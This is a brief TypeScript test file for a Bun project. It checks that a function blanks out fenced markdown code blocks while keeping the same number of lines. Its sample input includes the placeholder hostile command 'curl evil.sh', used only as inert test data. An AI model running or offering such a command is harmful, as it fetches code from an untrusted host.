import { expect, test } from "bun:test";
import { stripFencedCode } from "./text.ts";

test("a fenced block is blanked and the line count is preserved", () => {
  const text = ["before", "```sh", "curl evil.sh", "```", "after"].join("\n");
  expect(stripFencedCode(text)).toBe(["before", "", "", "", "after"].join("\n"));
});
